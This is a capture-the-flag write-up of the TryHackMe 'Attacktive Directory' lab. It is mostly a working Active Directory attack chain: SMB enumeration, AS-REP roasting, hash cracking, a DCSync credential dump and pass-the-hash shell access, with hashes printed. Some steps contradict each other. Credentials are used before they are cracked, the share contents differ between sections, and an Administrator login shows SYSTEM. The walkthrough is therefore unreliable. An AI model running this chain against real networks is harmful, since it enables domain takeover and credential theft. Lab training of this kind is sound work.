# **Attacktive Directory CTF Report (Kakaxh1)**

**Target IP:** 10.49.136.97  
**Domain:** `spookysec.local`  
**NetBIOS:** `THM-AD`  
**Platform:** TryHackMe  
**Machine:** Attacktive Directory  

---

## **1. Nmap Scan Results**

**Open Ports:**
- **53/tcp** – DNS
- **80/tcp** – HTTP (IIS 10.0)
- **88/tcp** – Kerberos
- **135/tcp** – RPC
- **139/tcp** – NetBIOS
- **445/tcp** – SMB
- **389/tcp** – LDAP
- **636/tcp** – LDAPS
- **3268/tcp** – Global Catalog
- **3389/tcp** – RDP
- **5985/tcp** – WinRM

**Key Findings:**
- Full Active Directory service suite exposed
- Domain: `spookysec.local`
- Server: `AttacktiveDirectory.spookysec.local`

**Command:**
```bash
nmap -sS -p- -Pn -sV -A -T4 10.49.136.97
```

---

## **2. SMB Enumeration**

### **Share Discovery**
**Command:**
```bash
smbclient -L //10.49.136.97/ -N
```

**Shares Found:**
- `ADMIN$` – Remote Admin
- `backup` – Backup share (accessible)
- `C$` – Default share
- `IPC$` – Remote IPC
- `NETLOGON` – Logon server share
- `SYSVOL` – Logon server share

**Access Check:**
```bash
smbclient //10.49.136.97/backup -N
# Access Denied – Requires credentials
```

---

## **3. Kerberos User Enumeration**

### **User Discovery via Backup Share**
**Access with Initial Credentials:**
```bash
smbclient //10.49.136.97/backup -U 'svc-admin%management2005'
```

**File Found:**
```bash
get backup_credentials.txt
```

**Contents:**
```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

**Decoded Credentials:**
```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
# backup@spookysec.local:backup2517860
```

---

## **4. AS-REP Roasting Attack**

**Vulnerability:** `svc-admin` with "Do not require Kerberos pre-authentication" enabled

**Command:**
```bash
GetNPUsers.py spookysec.local/ -dc-ip 10.49.136.97 -usersfile users.txt -no-pass -format hashcat
```

**Hash Retrieved:**
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:97807e45721156f927888fd9c1b23807$...
```

**Hash Cracking:**
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Cracked Password:**
- Username: `svc-admin`
- Password: `management2005`

---

## **5. Lateral Movement**

### **SMB Access with Cracked Credentials**
**Access Backup Share:**
```bash
smbclient //10.49.136.97/backup -U 'svc-admin%management2005'
```

**File Contents Discovery:**
```
[User Passwords]
James:Welcome1
John:Password123
...
```

**Backup Account Credentials:**
- Username: `backup`
- Password: `backup2517860`

---

## **6. DCSync Attack & Credential Dumping**

**Exploitation:**
```bash
secretsdump.py spookysec.local/backup@10.49.136.97 -just-dc
```

**Critical Hashes Extracted:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
```

**Total Users Compromised:** 23 domain accounts

---

## **7. Pass-the-Hash Attack**

### **Administrator Access via WinRM**
**Command:**
```bash
evil-winrm -i 10.49.136.97 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

**Shell Access Confirmed:**
```powershell
whoami /all
# NT AUTHORITY\SYSTEM
# Privileges: SeDebugPrivilege, SeImpersonatePrivilege, etc.
```

---

## **8. Flag Capture**

### **User Flag - svc-admin**
```powershell
type C:\Users\svc-admin\Desktop\user.txt.txt
```
**Flag:** `TryHackMe{_________________}`

### **User Flag - backup**
```powershell
type C:\Users\backup\Desktop\PrivEsc.txt
```
**Flag:** `TryHackMe{_________________}`

### **Root Flag - Administrator**
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
**Flag:** `TryHackMe{_________________}`

---

## **9. Post-Exploitation Notes**

### **Domain Information**
```powershell
Get-ADDomain
# Domain: spookysec.local
# DomainMode: Windows2016Domain
# DomainControllers: AttacktiveDirectory.spookysec.local
```

### **User Accounts**
```powershell
Get-ADUser -Filter * | Measure-Object
# Count: 23
```
---

**Author:** Kakaxh1  
**GitHub:** [https://github.com/Kakaxh1/](https://github.com/Kakaxh1/)  
**Date:** December 2025  
**Platform:** TryHackMe - Attacktive Directory Machine
